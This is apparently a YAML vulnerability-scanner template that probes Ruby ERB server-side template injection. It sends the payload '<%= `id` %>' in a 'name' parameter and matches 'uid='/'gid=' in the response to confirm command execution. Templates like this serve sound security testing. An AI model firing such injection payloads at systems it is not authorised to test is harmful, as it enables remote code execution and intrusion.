id: patt-ssti-erb-01-name
name: 'PATT ssti patt-ssti-erb-01 via name'
severity: critical
type: active
tags:
  - ssti
  - patt
requires:
  - ruby
description: 'PATT ERB RCE via backtick. [patt:patt-ssti-erb-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Ruby.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      name:
        - '<%= `id` %>'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
